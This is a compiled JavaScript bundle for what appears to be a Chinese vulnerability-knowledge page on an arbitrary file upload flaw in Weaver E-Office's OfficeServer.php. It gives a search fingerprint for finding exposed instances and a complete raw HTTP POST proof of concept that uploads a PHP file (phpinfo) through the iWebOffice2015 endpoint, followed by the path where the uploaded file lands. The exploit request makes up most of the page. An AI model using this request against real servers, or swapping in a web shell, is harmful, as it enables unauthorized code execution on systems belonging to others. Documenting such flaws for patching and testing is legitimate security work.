(window.webpackJsonp=window.webpackJsonp||[]).push([[211],{1723:function(s,t,a){s.exports=a.p+"assets/img/1664244931813-962fe535-f9cc-451e-9273-025d29d673df.b55342d5.png"},1724:function(s,t,a){s.exports=a.p+"assets/img/1664244962450-c8cb2723-109b-4090-95f1-dd250e2719a1.f927ae90.png"},1725:function(s,t,a){s.exports=a.p+"assets/img/1664245227470-24772f48-202e-402f-8e7f-3c63c2f1ed51.7ccd5a5f.png"},3058:function(s,t,a){"use strict";a.r(t);var e=a(75),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"泛微oa-e-office-officeserver-php-任意文件上传漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-e-office-officeserver-php-任意文件上传漏洞"}},[s._v("#")]),s._v(" 泛微OA E-Office OfficeServer.php 任意文件上传漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("泛微OA E-Office OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("泛微OA E-Office")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v('"eoffice10"')]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("登录页面")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1723),alt:"img"}})]),s._v(" "),e("p",[s._v("验证POC")]),s._v(" "),e("div",{staticClass:"language-sql line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sql"}},[e("code",[s._v("POST "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("eoffice10"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("server"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("iWebOffice2015"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("OfficeServer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php HTTP"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost: \nAccept: "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("text")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("html"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("application"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("xhtml"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("xml"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("application"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("xml"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("image"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("avif"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("image"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("webp"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("image"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("apng"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("application"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("signed"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("exchange"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("b3"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),s._v("\nAccept"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding: gzip"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" deflate\nAccept"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Language")]),s._v(": zh"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("CN"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("zh"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),s._v("\nCache"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Control: max"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("age"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nConnection: "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("close")]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Length: "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("990")]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Type")]),s._v(": multipart"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("form"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("data")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" boundary"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----WebKitFormBoundaryLpoiBFy4ANA8daew")]),s._v("\nOrigin: "),e("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("null")]),s._v("\nUpgrade"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Insecure"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Requests: "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("User")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent: Mozilla"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows NT "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Win64"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" x64"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("KHTML"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("like")]),s._v(" Gecko"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("92.0")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v(".4515")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v(".159")]),s._v(" Safari"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("------WebKitFormBoundaryLpoiBFy4ANA8daew")]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Disposition: form"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("data")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("name"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"FileData"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("filename"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test.php"')]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Type")]),s._v(": application"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("octet"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("stream\n\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("?php\nphpinfo"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n?"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("------WebKitFormBoundaryLpoiBFy4ANA8daew")]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Disposition: form"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("data")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("name"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"FormData"')]),s._v("\n\n{"),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'USERNAME'")]),s._v(":"),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'admin'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'RECORDID'")]),s._v(":"),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'undefined'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'OPTION'")]),s._v(":"),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'SAVEFILE'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'FILENAME'")]),s._v(":"),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'test.php'")]),s._v("}\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("------WebKitFormBoundaryLpoiBFy4ANA8daew--")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1724),alt:"img"}})]),s._v(" "),e("p",[s._v("文件上传位置")]),s._v(" "),e("div",{staticClass:"language-sql line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sql"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("eoffice10"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("server"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("iWebOffice2015"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Document"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("test"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1725),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);